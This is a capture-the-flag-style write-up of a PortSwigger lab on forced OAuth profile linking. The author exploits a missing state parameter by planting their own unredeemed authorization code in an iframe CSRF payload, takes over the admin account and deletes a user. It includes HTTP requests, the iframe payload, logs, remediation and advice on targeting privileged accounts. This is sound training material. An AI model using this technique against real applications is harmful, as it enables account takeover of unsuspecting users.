# Forced OAuth Profile Linking

**Platform:** PortSwigger Web Security Academy<br>
**Category:** OAuth 2.0 / CSRF / Account Takeover<br>
**Difficulty:** Practitioner<br>
**Date Solved:** 2026-10-27<br>
**Severity:** Critical

## Summary

The blog application lets a logged-in user attach a social media profile to their existing account, so they can log in via OAuth afterward instead of a password. The request that performs this linking (`GET /auth?...&redirect_uri=.../oauth-linking`) has **no `state` parameter** — meaning the authorization code returned to `/oauth-linking?code=...` is never tied back to the session that initiated the OAuth flow. Because the linking step is driven entirely by a GET request with the code as a URL parameter, an attacker can intercept their *own* valid authorization code, never redeem it, and instead plant it in a CSRF payload. When the victim's authenticated browser loads that URL, the server links the *attacker's* social identity to the *victim's* blog account. The attacker then logs in via "Log in with social media" and lands directly inside the victim's account — in this case, the admin account.

## Affected Component

- `GET /auth?client_id=...&redirect_uri=https://<lab-id>/oauth-linking&response_type=code&scope=openid%20profile%20email` — authorization request for the "Attach a social profile" flow. No `state` parameter present.
- `GET /oauth-linking?code=...` — the vulnerable linking endpoint. Takes an authorization code and attaches the resulting social identity to **whichever account is currently authenticated in the browser making this request** — with zero binding between the code and the account that originally requested it.
- `GET /oauth-login?code=...` — the normal "Log in with social media" endpoint, used afterward to actually authenticate via the now-linked social profile.

## Steps to Reproduce

1. Logged into the blog normally with `wiener:peter` (classic form login, not social).
2. From **My account**, clicked **"Attach a social profile"** once just to observe the flow — completed it normally with `peter.wiener:hotdog` to confirm the feature worked, then moved to the actual attack.
3. Reviewed the proxy history for the attach flow and found the initiating request:
   ```
   GET /auth?client_id=kx96wtc8kwu88hqnwb03q&redirect_uri=https://0a040029034892d1800417c400b800f9.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
   Host: oauth-0ac900db03e692a78029155102ab0050.oauth-server.net
   ```
   Confirmed: `redirect_uri` sends the resulting code to `/oauth-linking`, and critically — **no `state` parameter anywhere in this request.** That's the CSRF gap: nothing ties the eventual code redemption back to this specific browser/session.
4. **First attempt failed** — initially captured and copied a code from the wrong flow (`GET /oauth-login?code=...`, the *login* endpoint, not `/oauth-linking`, the *attach* endpoint) and that code had already been redeemed by my own browser before being reused in the exploit (confirmed via proxy history showing a completed `200 OK` with a fresh `Set-Cookie: session=...` for that exact code value). Authorization codes are single-use, so the delivered exploit silently failed with a dead code. Lesson: confirm the exact endpoint path, not just that a `code=` parameter is present, before capturing.
5. Redid the capture correctly:
   - Logged out, logged back in as `wiener:peter`.
   - Turned on **Burp Proxy → Intercept**.
   - Clicked **"Attach a social profile"** again.
   - Forwarded requests one at a time, watching for `/oauth-linking?code=...` specifically (confirmed the preceding `GET /auth?...` request's `redirect_uri` pointed at `/oauth-linking`, not `/oauth-login`, before continuing).
   - Intercepted:
     ```
     GET /oauth-linking?code=5s_BLwurq3tWC19VTfZuXiKPz59Sp1HertfrNp6bJsJ HTTP/2
     Host: 0a040029034892d1800417c400b800f9.web-security-academy.net
     Cookie: session=JXa4gf9rrPr2AmInpZK6dmBLiiLsjj4H
     ```
   - **Copied the URL**, then **Dropped** the request — critical, so the code is never redeemed and stays valid.
   - Turned off intercept, logged out of the blog entirely.
6. Built the CSRF delivery on the exploit server:
   ```html
   <iframe src="https://0a040029034892d1800417c400b800f9.web-security-academy.net/oauth-linking?code=5s_BLwurq3tWC19VTfZuXiKPz59Sp1HertfrNp6bJsJ"></iframe>
   ```
7. **Store**d and **Deliver**ed to victim. Exploit server access log confirmed the admin's browser actually fetched it:
   ```
   10.0.3.146  2026-10-27 01:18:02 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36"
   ```
   The admin's always-active session loaded the iframe, which silently completed the OAuth linking server-side using the attacker's stolen code against the admin's authenticated session — no visible UI, no interaction needed from the admin beyond having the page open.
8. Went back to the blog, clicked **"Log in with social media"**, authenticated with `peter.wiener:hotdog`:
   ```
   GET /oauth-login?code=tcv9QAK-5uLLOyXcTXd2EhkHBMWIEyeSw2TWpN6SWGU HTTP/2
   ```
   Response: `200 OK`, new `Set-Cookie: session=SJB8JJAY7...` — logged straight into the **admin** account, no password required.
9. Opened the admin panel and deleted `carlos`. Lab solved.

## Proof of Concept

**Step 1 — stolen linking code (never redeemed by the attacker):**
```http
GET /oauth-linking?code=5s_BLwurq3tWC19VTfZuXiKPz59Sp1HertfrNp6bJsJ HTTP/2
Host: 0a040029034892d1800417c400b800f9.web-security-academy.net
```

**Step 2 — CSRF delivery (exploit server body):**
```html
<iframe src="https://0a040029034892d1800417c400b800f9.web-security-academy.net/oauth-linking?code=5s_BLwurq3tWC19VTfZuXiKPz59Sp1HertfrNp6bJsJ"></iframe>
```

**Step 3 — confirmed victim (admin) fetched it, via exploit server log:**
```
10.0.3.146  2026-10-27 01:18:02 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) ..."
```

**Step 4 — attacker logs in via social media, lands in admin's account:**
```http
GET /oauth-login?code=tcv9QAK-5uLLOyXcTXd2EhkHBMWIEyeSw2TWpN6SWGU HTTP/2
Host: 0a040029034892d1800417c400b800f9.web-security-academy.net

HTTP/2 302 Found
Set-Cookie: session=SJB8JJAY7...
```

**Exploit server access log — confirms the admin's browser fetched the malicious page:**

![Exploit server log showing the victim (admin) request](<../assets/forced-oauth-profile-linking-exploit-log.png>)

```
10.0.3.146  2026-10-27 01:18:02 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36"
```

**Final result — lab solved, logged in as admin, `carlos` deleted via the admin panel:**

![Lab solved banner and admin panel confirming carlos was deleted](<../assets/forced-oauth-profile-linking-solved.png>)

The admin panel's `Users` list shows only `wiener` remaining — `carlos` was successfully removed using the hijacked admin session, and the lab status reads "Solved."

## Root Cause

OAuth's `state` parameter exists specifically to bind an authorization request to the browser session that initiated it, preventing exactly this class of attack. This client application omits `state` entirely on the account-linking flow. Combined with the fact that `/oauth-linking` performs its action (linking a social identity to an account) based purely on **whichever session cookie happens to be active** when the code is redeemed — rather than re-verifying that the redeeming browser is the same one that started the flow — the endpoint becomes a pure CSRF target: any authenticated user who's tricked into loading `/oauth-linking?code=ATTACKER_CODE` has the attacker's identity linked to their account, with no confirmation step.

## Impact

**Technical**
- Full account takeover of any victim who can be made to load a single GET request while authenticated — no password, no visible interaction, works via an invisible iframe
- Specifically chained here into **admin account takeover**, the highest-value target on the platform
- Attack requires only one valid-but-unredeemed OAuth code from the attacker's own (low-privilege) account — trivial to obtain

**Business / Real-World**
- Because the victim here was explicitly the always-logged-in admin, this is a direct path to full administrative control of the application
- Silent and interaction-light: the only thing the victim does is have a malicious page open in a browser tab — no click, no form submission, no visible prompt
- Demonstrates how a single missing CSRF control on an OAuth account-management endpoint can be worse than a missing control on an ordinary form, because it grants persistent, password-free access

**Scope**
- Any account on the blog application, including the administrator account, is a potential CSRF-linking victim

## Remediation

- Always include and validate a cryptographically random, single-use `state` parameter on every OAuth authorization request, and verify it matches on the callback before processing the code.
- On the linking/callback endpoint, bind the authorization code's redemption to the exact session/user that initiated the flow (e.g., store the initiating session ID server-side alongside the pending `state`, and reject a redemption from a different session).
- Treat account-linking actions as sensitive state-changing operations: require a fresh, explicit user confirmation (e.g., a POST with a CSRF token) rather than a bare GET request that a `<img>`/`<iframe>` tag can trigger silently.
- Consider requiring re-authentication or an additional confirmation step before attaching any new external identity to an existing account, especially privileged ones.

## Lessons Learned & Patterns

- **Verify the exact endpoint path before capturing a code, not just that `code=` is present in the URL.** Grabbed a code from `/oauth-login` (the login endpoint) by mistake on the first attempt instead of `/oauth-linking` (the attach endpoint) — visually similar, functionally completely different, and the mistake wasn't obvious until the exploit silently failed. Always double check the full path of the captured request against what the "Observe the GET /auth request" step told you to expect, before copying/dropping anything.
- **Authorization codes are single-use — confirm a code was actually dropped, not redeemed, before trusting it in an exploit.** If a captured code shows up anywhere else in proxy history with a completed `200` response and a fresh session cookie, it's already burned; grab a new one.
- **Missing `state` on an OAuth flow is the single highest-value thing to check first** on any "attach social account" / "link identity provider" feature — it's the one parameter whose entire job is preventing this exact attack class, and its absence is visible in a single request with no further testing needed.
- **GET-based state-changing endpoints are inherently CSRF-able via nothing more than an `<iframe>`** — no form, no click, no JS execution needed on the attacker's page at all. Worth specifically flagging any state-changing GET endpoint (account linking, email change, permission grant) encountered in future recon as an immediate CSRF candidate.
- **Reusable technique for future OAuth/SSO targets:** any "link your account to X" feature is worth testing for (a) missing `state`, and (b) whether the linking step is a bare GET — if both are true, this exact code-interception-and-CSRF-delivery chain applies directly, and can often be aimed at a high-privilege account if one can be identified as a forced victim (support staff, admin panels, "always logged in" service accounts).

## References

- PortSwigger Lab: Forced OAuth profile linking
- RFC 6749 §10.12: OAuth 2.0 Cross-Site Request Forgery
- OWASP: Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet
- [Forced OAuth Profile Linking Lab (PortSwigger)](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
- [OAuth Authentication Topic (PortSwigger)](https://portswigger.net/web-security/oauth)
- [RFC 6749 – OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [RFC 9700 – OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700)
- [OWASP OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html)
- [Auth0 – State Parameters for CSRF Protection](https://auth0.com/docs/secure/attack-protection/state-parameters)
- [USENIX Security ’25 – Cross-app OAuth Attacks](https://www.usenix.org/conference/usenixsecurity25/presentation/luo)
- [Security Stack Exchange – CSRF in OAuth Authorization Code Flow](https://security.stackexchange.com/questions/285319/how-can-csrf-occur-in-oauth2-using-the-authorisation-code-flow-if-not-using-the)

**Tags:** #PortSwigger #OAuth #CSRF #AccountTakeover #AdminTakeover
